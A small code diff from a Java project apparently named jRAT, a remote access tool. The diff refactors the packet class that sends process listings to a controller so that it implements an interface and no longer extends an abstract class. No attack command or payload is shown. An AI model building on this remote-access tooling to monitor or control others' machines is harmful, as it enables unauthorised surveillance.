@@ -1,14 +1,14 @@
 package jrat.module.process;
 
 import jrat.client.Connection;
-import jrat.client.packets.outgoing.AbstractOutgoingPacket;
+import jrat.client.packets.outgoing.OutgoingPacket;
 import jrat.common.ProcessData;
 
 import javax.imageio.ImageIO;
 import java.io.ByteArrayOutputStream;
 
 
-public class Packet25Process extends AbstractOutgoingPacket {
+public class Packet25Process implements OutgoingPacket {
 
 	private ProcessData processData;
 
